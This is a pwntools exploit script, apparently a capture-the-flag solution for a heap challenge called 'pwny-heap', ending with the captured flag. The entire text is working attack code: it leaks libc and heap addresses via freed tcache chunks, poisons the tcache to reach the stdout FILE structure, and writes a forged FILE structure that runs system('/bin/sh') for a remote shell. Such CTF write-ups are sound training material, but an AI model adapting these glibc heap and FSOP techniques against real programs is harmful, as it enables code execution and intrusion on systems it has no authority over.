#!/usr/bin/python3
from pwn import *

context.log_level = 'info'
exe = context.binary = ELF("/home/kali/Desktop/pwny-heap/pwny-heap_patched")
libc = exe.libc

gdbscript = '''
vmmap
continue
'''
def start():
    if not args.REMOTE:
        r = exe.process()
        if args.GDB:
            gdb.attach(r, gdbscript=gdbscript)
    else:
        r = remote('c8a11939-f265-4ceb-99a1-8b9fe656d76e.x3c.tf', 31337, ssl=True)
    return r

io = start()

####### HELPERS #######

def malloc(index, size):
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b"index: ", b"%d" % index)
    io.sendlineafter(b"size: ", b"%d" % size)

def free(index):
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b"index: ", b"%d" % index)

def view(index):
    io.sendlineafter(b"> ", b"3")
    io.sendlineafter(b"index: ", b"%d" % index)
    io.recvuntil(b": ")
    raw = io.recvuntil(b"1. ")[:-3]
    return raw

def write(index, data):
    io.sendlineafter(b"> ", b"4")
    io.sendlineafter(b"index: ", b"%d" % index)
    io.sendlineafter(b"write something in: ", b"%s" % data)

####### BEGIN #######

##### LEAKING LIBC #####

for i in range(9):
    malloc(i, 0xf8)

for i in range(8):
    free(i)

raw_libc_leak = view(7)
libc_leak = u64(raw_libc_leak + b"\x00"*(8 - len(raw_libc_leak)))

log.info("LIBC leak @ %s" % hex(libc_leak))

libc.address = libc_leak - (0x7fe115c1ace0 - 0x7fe115a00000)

log.info("LIBC @ %s" % hex(libc.address))

##### LEAKING HEAP #####

raw_heap_base = view(0)
heap_base = u64(raw_heap_base + b"\x00"*(8 - len(raw_heap_base)))*0x1000

log.info("HEAP @ %s" % hex(heap_base))

##### GETTING SHELL #####

malloc(10, 0xf8) # this will go in ID 6
free(6)

b = heap_base + 0x8a0
target = libc.symbols['_IO_2_1_stdout_']

# https://github.com/shellphish/how2heap/blob/master/glibc_2.35/tcache_poisoning.c
# b[0] = (intptr_t)((long)target ^ (long)b >> 12);

towrite = target ^ (b>>12)

write(10, p64(towrite))

malloc(11, 0xf8)
malloc(12, 0xf8)

# https://github.com/nobodyisnobody/docs/blob/main/code.execution.on.last.libc/README.md#3---the-fsop-way-targetting-stdout
# updated for 2.35

stdout = libc.sym['_IO_2_1_stdout_']
fake_vtable = libc.sym['_IO_wfile_jumps']-0x18
gadget = next(libc.search(asm('add rdi, 0x10 ; jmp rcx')))

fake = FileStructure(0)
fake.flags = 0x3b01010101010101
fake._IO_read_end=libc.sym['system']  
fake._IO_save_base = gadget
fake._IO_write_end=u64(b'/bin/sh\x00')
fake._lock=stdout+0x8*7
fake._codecvt= stdout + 0xb8
fake._wide_data = stdout+0x200
fake.unknown2=p64(0)*2+p64(stdout+0x20)+p64(0)*3+p64(fake_vtable)

write(12, fake)

io.interactive()

# MVM{pwnpope_is_mining_xmr_on_your_machine_for_the_vatican}